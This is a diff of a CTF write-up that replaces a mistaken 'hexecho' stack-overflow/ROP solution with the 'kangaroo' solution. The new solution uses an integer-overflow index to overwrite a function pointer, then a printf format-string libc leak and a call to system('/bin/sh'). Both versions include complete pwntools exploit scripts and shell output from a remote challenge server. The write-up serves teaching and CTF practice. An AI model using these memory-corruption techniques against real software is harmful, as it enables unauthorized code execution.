@@ -98,7 +98,7 @@ int main() {
   return 0;
 }
 ```
-This program unecheck the size, so there are BOF vulnerability.
+Since the size check is lax, we can specify the arbitrary offset to overwrite using an integer overflow.
 ```
 $ checksec kangaroo
 [*] '/home/colza/kangaroo'
@@ -109,165 +109,18 @@ $ checksec kangaroo
     PIE:        No PIE (0x400000)
     Stripped:   No
 ```
-It is difficult to leak the canary.  
-If `scanf` is given some uninterpretable characters, `scanf` do not write characters to buffer. And then, that characters remain in the stream, causing all subsequent calls to `scanf` to fail.  
-If enter `+` or `-`, it will be interpreted as a hexadecimal value and cause `scanf` to fail.
 
 The apploach is as follows:
-* Evade to overwrite the canary using `+`.
-* Libc leak and overwrite the return address to `hexecho`.
-* `system('/bin/sh')` with ROP chain.
-* globalからlibc leak
-* globalから  fn_clearをsystem('/bin/sh')に上書き
-* clearで発火
+* By overwriting `fn_clear` with an arbitrary function pointer, call any function.
+* Overwriting `fn_clear` with `printf` causes a libc leak in FSB.
+* Overwriting `fn_clear` with `system('/bin/sh')`
+* Calling `fn_clear` trigger calling an arbitrary function.
 
-The return addres is located at rbp+0x8. So, offset from input to return address is 0x118.
-```
-  401292:       48 8d 85 f0 fe ff ff    lea    rax,[rbp-0x110]
-  401299:       89 d6                   mov    esi,edx
-  40129b:       48 89 c7                mov    rdi,rax
-  40129e:       e8 46 ff ff ff          call   4011e9 <get_hex>
-```
-As `_IO_2_1_stdout_` is at `0x110-0x78=0x98` among the data that can be leaked, we will use this to calculate the libc base.
-```
-03:0018│ rax rdi 0x7fffffffdad0 ◂— 0
-04:0020│-108     0x7fffffffdad8 ◂— 0
-05:0028│-100     0x7fffffffdae0 ◂— 0x40 /* '@' */
-06:0030│-0f8     0x7fffffffdae8 ◂— 4
-07:0038│-0f0     0x7fffffffdaf0 ◂— 0x40 /* '@' */
-08:0040│-0e8     0x7fffffffdaf8 ◂— 0x10
-09:0048│-0e0     0x7fffffffdb00 ◂— 0
-0a:0050│-0d8     0x7fffffffdb08 ◂— 0x100000000
-0b:0058│-0d0     0x7fffffffdb10 ◂— 0
-0c:0060│-0c8     0x7fffffffdb18 ◂— 0x8e00000006
-0d:0068│-0c0     0x7fffffffdb20 ◂— 0x80000000a /* '\n' */
-0e:0070│-0b8     0x7fffffffdb28 ◂— 0
-... ↓            2 skipped
-11:0088│-0a0     0x7fffffffdb40 ◂— 2
-12:0090│-098     0x7fffffffdb48 ◂— 0x8000000000000006
-13:0098│-090     0x7fffffffdb50 ◂— 0
-... ↓            2 skipped
-16:00b0│-078     0x7fffffffdb68 —▸ 0x7ffff7e1b780 (_IO_2_1_stdout_) ◂— 0xfbad2887
-```
+Since `g_message` and `fn_clear` are adjacent, the offset is 0x240.  
+Since it will pass the size check if it is smaller than 0x240, so aim for 0x238.  
+The negative number that, when multiplied by 0x48, equals 0x238 is `-1024819115206086193`.
 
-The steps are as follows:
- * set the input size 0x128
- * send the payload consist of 0x118-padding, ret and main address
- * leak address and calculate the libc base address
- * set the input size 0x138
- * send the payload consist of 0x118-padding and `system("/bin/sh")` ROP chain
- * get the flag
-
-Execution code below:
-```python solve.py
-from pwn import *
-
-elf = ELF("./hexecho")
-libc = ELF("./libc.so.6")
-
-context.arch = 'amd64'
-
-p = remote("34.170.146.252", 42121)
-
-p.sendlineafter(b"Size: ", b"296")
-
-main_addr = elf.symbols['main']
-
-ret_main = p64(next(elf.search(asm("ret"), executable=True)))
-ret_main += p64(main_addr)
-
-payload = b"+ "*0x118
-payload += b" ".join([f"{c:02x}".encode() for c in ret_main])
-
-p.sendlineafter(b"Data (hex): ", payload)
-
-p.recvuntil(b"Received: ")
-leak = bytes([int(c, 16) for c in p.recvline().split()])
-libc.address = u64(leak[0x98:0xa0]) - libc.symbols['_IO_2_1_stdout_']
-log.info(hex(libc.address))
-
-rop = p64(next(libc.search(asm("pop rdi; ret"), executable=True)))
-rop += p64(next(libc.search(b"/bin/sh\x00")))
-rop += p64(next(libc.search(asm("ret"), executable=True)))
-rop += p64(libc.symbols["system"])
-
-rop_payload = b"+ "*0x118
-rop_payload += b" ".join([f"{c:02x}".encode() for c in rop])
-
-p.sendlineafter(b"Size: ", b"312")
-p.sendlineafter(b"Data (hex): ", rop_payload)
-
-p.recvline()
-p.interactive()
-```
-Execute it.
-```
-$ python3 solve.py
-[*] '/home/colza/hexecho'
-    Arch:       amd64-64-little
-    RELRO:      Partial RELRO
-    Stack:      Canary found
-    NX:         NX enabled
-    PIE:        No PIE (0x400000)
-    SHSTK:      Enabled
-    IBT:        Enabled
-    Stripped:   No
-[*] '/home/colza/libc.so.6'
-    Arch:       amd64-64-little
-    RELRO:      Partial RELRO
-    Stack:      Canary found
-    NX:         NX enabled
-    PIE:        PIE enabled
-    SHSTK:      Enabled
-    IBT:        Enabled
-[+] Opening connection to 34.170.146.252 on port 42121: Done
-[*] 0x7f24d72de000
-[*] Switching to interactive mode
-$ ls
-run
-$ cd ../
-$ ls
-app
-bin
-boot
-dev
-etc
-flag.txt
-home
-lib
-lib32
-lib64
-libx32
-media
-mnt
-opt
-proc
-root
-run
-sbin
-srv
-sys
-tmp
-usr
-var
-$ cat flag.txt
-Alpaca{4Lw4y5_cH3cK_1f_a_fuNc71on_f4iL3d}
-$ exit
-[*] Got EOF while reading in interactive
-$
-$
-[*] Closed connection to 34.170.146.252 port 42121
-[*] Got EOF while sending in interactive
-```
-
-Got the flag!
-
-`Alpaca{4Lw4y5_cH3cK_1f_a_fuNc71on_f4iL3d}`
-
-# References
-`g_messages[SLOT*SIZE]`は最大0x240offset
-offsetは`index*SIZE=0x240`
-sizeの8を掛けて0x238になるindex値は`-1024819115206086193`
+The offset of the libc function when calling `printf` is `9`.
 ```
  ► 0x4013ea <main+245>    call   rax                         <clear_message>
         rdi: 0x404080 (g_messages) ◂— 0
@@ -290,11 +143,121 @@ sizeの8を掛けて0x238になるindex値は`-1024819115206086193`
    0x40135a <main+101>    call   __isoc99_scanf@plt          <__isoc99_scanf@plt>
 ───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
 00:0000│ rsp 0x7fffffffdbd0 ◂— 0x3ffffdcc0
-01:0008│-008 0x7fffffffdbd8 —▸ 0x7fffffffdd08 —▸ 0x7fffffffdfc0 ◂— '/mnt/c/Users/NAEL/Desktop/kangaroo'
+01:0008│-008 0x7fffffffdbd8 —▸ 0x7fffffffdd08 —▸ 0x7fffffffdfc0 ◂— '/home/colza/kangaroo'
 02:0010│ rbp 0x7fffffffdbe0 —▸ 0x7fffffffdc80 —▸ 0x7fffffffdce0 ◂— 0
 03:0018│+008 0x7fffffffdbe8 —▸ 0x7ffff7dd31ca ◂— mov edi, eax
 ```
-printfのindex9でlibcのアドレスリークができる。
+`0x7ffff7dd31ca ◂— mov edi, eax` is located at `__libc_init_first+138`.
 
-000000000002a140 T __libc_init_first@@GLIBC_2.2.5
-__libc_init_first+138
+The steps are as follows:
+ * overwrite `fn_clear` with `printf` plt address
+ * write format string for leaking libc base address to `g_message`
+ * call the overwritten `fn_clear`
+ * calculate the libc base address
+ * overwrite `fn_celar` with `system` address
+ * write `/bin/sh` to `g_message`
+ * call the overwritten `fn_clear` and get the flag
+
+Execution code below:
+```python solve.py
+from pwn import *
+
+elf = ELF("./kangaroo")
+libc = ELF("./libc.so.6")
+
+context.arch = 'amd64'
+
+p = remote("34.170.146.252", 64357)
+
+def read(index, message):
+    p.sendlineafter(b"> ", b"1")
+    p.sendlineafter(b"Index: ", str(index).encode())
+    p.sendlineafter(b"Message: ", message)
+
+def write(index):
+    p.sendlineafter(b"> ",b"2")
+    p.sendlineafter(b"Index; ", str(index).encode())
+    p.recvuntil(b"Message: ")
+
+def clear():
+    p.sendlineafter(b"> ", b"3")
+
+printf_plt_addr = elf.plt['printf']
+log.info(hex(printf_plt_addr))
+fn_clear_index = -1024819115206086193
+
+libc_leak_payload = b"a"*0x8 + p64(printf_plt_addr)
+read(fn_clear_index, libc_leak_payload)
+read(0, b"%9$p")
+clear()
+
+p.recvuntil(b"0x")
+libc_init_first_offset = libc.symbols['__libc_init_first']
+libc.address = int(p.recvuntil(b"a"), 16) - libc_init_first_offset - 138
+log.info(hex(libc.address))
+
+system_addr = libc.symbols['system']
+shell_payload = b"a"*0x8 + p64(system_addr)
+read(fn_clear_index, shell_payload)
+read(0, b"/bin/sh")
+clear()
+
+p.interactive()
+```
+Execute it.
+```
+$ python3 solve.py
+[*] '/home/colza/kangaroo'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+[*] '/home/colza/libc.so.6'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    FORTIFY:    Enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+[+] Opening connection to 34.170.146.252 on port 64357: Done
+[*] 0x401050
+[*] 0x7f43376f8000
+[*] Switching to interactive mode
+$ ls
+bin
+boot
+dev
+etc
+flag-e9e0d45ed3c58df0dc0ba1107060614f.txt
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+$ cat flag*
+Alpaca{Ch3cK-4f7Er-buG_1s_m34n1NgL3s5}
+$ exit
+> $ 3
+[*] Got EOF while reading in interactive
+$
+[*] Closed connection to 34.170.146.252 port 64357
+[*] Got EOF while sending in interactive
+```
+
+Got the flag!
+
+`Alpaca{Ch3cK-4f7Er-buG_1s_m34n1NgL3s5}`
